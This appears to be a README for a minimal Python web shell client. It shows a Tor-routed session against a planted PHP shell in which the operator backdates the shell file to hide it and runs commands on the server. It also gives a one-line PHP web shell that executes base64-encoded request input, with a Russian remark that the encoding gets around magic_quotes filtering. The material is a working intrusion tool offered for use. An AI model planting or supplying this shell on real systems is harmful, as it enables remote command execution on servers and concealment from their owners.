# Minimalistic Python WebShell

```zsh
$ torify webshell 'https://vuln.com/path/to/shell/ajax.php'
Welcome to WebShell!
WebShell> touch -a -m -t 201705030100.12 ajax.php

WebShell> ls -lah
total 36K
drwxr-xr-x  5 root root 4.0K Aug  4 00:26 .
drwxr-xr-x 18 root root 4.0K Jan 17  2018 ..
-rw-r--r--  1 root root  533 May  3  2017 .jshintrc
-rw-r--r--  1 root root 2.7K May  3  2017 Gruntfile.js
-rw-r--r--  1 root root   47 May  3  2017 ajax.php
drwxr-xr-x  4 root root 4.0K May  3  2017 images
drwxr-xr-x  4 root root 4.0K May  3  2017 js
-rw-r--r--  1 root root  466 May  3  2017 package.json
drwxr-xr-x  2 root root 4.0K May  3  2017 resource

WebShell> ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root  786766  0.1  0.0 382984 24116 ?        Ss   00:45   0:00 lsphp
root  787446  0.0  0.0 383416 10240 ?        Ss   00:46   0:00 lsphp:vuln.com/public_html/path/to/shell/ajax.php
root  787447  0.0  0.0   9776  1140 ?        S    00:46   0:00 sh -c ps -aux 2>&1
root  787448  0.0  0.0  49836  1652 ?        R    00:46   0:00 ps -aux

WebShell> exit
```

Shell example:

```php
<?php @passthru(base64_decode($_REQUEST['c']));
```

Base64 нужен для обхода `magic_quotes_gpc = On`.
